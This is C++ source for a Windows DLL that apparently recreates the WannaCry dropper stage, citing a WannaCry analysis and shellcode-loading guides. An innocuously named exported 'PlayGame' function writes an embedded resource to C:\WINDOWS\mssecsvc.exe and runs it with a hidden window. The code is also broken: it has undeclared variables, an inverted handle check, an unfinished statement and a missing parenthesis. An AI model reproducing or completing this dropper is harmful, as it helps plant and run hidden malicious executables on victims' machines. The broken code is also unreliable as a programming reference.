#include <Windows.h>

//assistance from: 
//https://blog.kartone.ninja/2019/05/23/malware-analysis-a-wannacry-sample-found-in-the-wild/
//https://www.programmersought.com/article/5646318912/
//https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
//https://cboard.cprogramming.com/windows-programming/117578-hmodule-current-dll.html
//https://stackoverflow.com/questions/13408306/including-a-text-file-as-a-local-resource-in-an-exe 
//https://docs.microsoft.com/en-us/windows/win32/procthread/creating-processes

extern "C" VOID __declspec(dllexport) PlayGame();

//global
char szDest[MAX_PATH];

extern "C" VOID __declspec(dllexport) PlayGame()
{
    sprintf(szDest,"C:\\%s\\%s","WINDOWS","mssecsvc.exe");
    ExtractAndCreate();
    RunProcess();
}

int ExtractAndCreate()
{
    HRSRC hSrc;
    HANDLE hFile;
    DWORD NumberOfBytesToWrite = 0;
    DWORD ResourceSize;
    HGLOBAL hResourceData;
    PVOID pRsrc;
    hSrc = FindResourceA(hModule, 101, "W");
    hResourceData = LoadResource(hModule, hSrc);
    pRsrc = LockResource(hResourceData);
    ResourceSize = SizeOfResource(hModule, Hsrc);
    
    //dwFlagsAndTrributes = 4
    //find out whatever 0x40000000 is
    HANDLE hFile = CreateFileA(szDest, 0x40000000, 2,0,2,4,0);
    if(!hFile)
    {
         WriteFile(hFile, pRsrc, ResourceSize, NumberOfBytestoWrite, NULL);
         CloseHandle(hFile);
    }
}

int RunProcess()
{
     PROCESS_INFORMATION ProcessInformation;
     STARTUPINFOA StartupInfo;
     ProcessInformation.hProcess = oi64;
     ProcessInformation.hThread = oi64;
     ProcessInformation.hProcessId = oi64;
     ProcessInformation.
     StartupInfo.cb = 104;
     StartupInfo.wShowWindow = 0;
     StartupInfo.dwFlags = 129;
     if(CreateProcess(szDest, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInformation)
     {
          CloseHandle(ProcessInformation.hThread);
          CloseHandle(ProcessInformation.hProcess);
     }
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID)
{

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "DLL_PROCESS_ATTACH", MB_OK);
    }
    break;
    case DLL_PROCESS_DETACH:
    {
        //detach
    }
    break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
